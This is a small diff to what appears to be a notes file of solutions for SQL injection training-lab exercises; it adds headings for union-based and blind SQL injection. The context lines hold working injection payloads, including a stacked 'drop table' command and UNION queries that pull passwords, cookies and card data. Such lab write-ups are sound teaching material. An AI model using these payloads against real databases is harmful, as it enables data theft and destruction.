@@ -39,6 +39,7 @@ Solution:
 Smith' ; drop table access_log --
 --SQL Injection (advanced)
 3. Pulling data from other tables
+---UNION BASED & JOINS
 Solution:
 Dave'; SELECT * from user_system_data --
 Your query was: SELECT * FROM user_data WHERE last_name = 'Dave'; SELECT * from user_system_data --'
@@ -47,6 +48,7 @@ Name: Dave
 Password: passW0rD
 UNION
 'or 1=1 union select userid, A.user_name,A.password,A.cookie, B.cc_type,B.cookie,B.login_count from user_system_data A, user_data B --
+---BLIND SQL
 -----------------------------
 (2) Broken Authentication
 -----------------------------
